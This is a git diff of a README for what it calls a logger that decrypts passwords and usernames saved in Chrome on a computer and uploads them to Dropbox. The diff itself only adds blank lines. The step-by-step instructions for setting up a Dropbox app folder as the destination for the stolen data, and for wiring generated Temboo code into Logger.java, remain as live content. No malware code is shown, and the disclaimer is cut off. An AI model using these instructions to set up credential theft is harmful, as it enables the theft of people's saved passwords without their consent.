@@ -2,17 +2,29 @@
 A logger that decrypts chrome usernames and passwords saved on the computer and uploads them to DropBox.
 
 # Instructions
+
 **Step 1:** Create a DropBox account: https://www.dropbox.com/register
+
 **Step 2:** Create a new app: https://www.dropbox.com/developers/apps/create
+
 **Step 3:** Click on DropBox API.
+
 **Step 4:** Click App Folder.
+
 **Step 5:** Name your app. This is where all the decrypted files will be uploaded.
+
 **Step 6:** Now, in your [dashboard](https://www.dropbox.com/home), you should see a new \"Apps\" folder.
+
 **Step 7:** Now, there should be a folder with the name of your app.
+
 **Step 8:** Inside, this folder, there should be a RootFolder.
+
 **Step 9:** Go to [temboo](https://temboo.com/) and create an account.
+
 **Step 10:** Watch this [short video](https://www.temboo.com/videos#oauthchoreos) to configure temboo.
+
 **Step 11:** Configure the test runner in the video to generate java code by clicking near the top.
+
 **Step 12:** Once this code has been generated, replace lines 140-158 in Logger.java with this auto-generated code.
 
 # Disclaimer
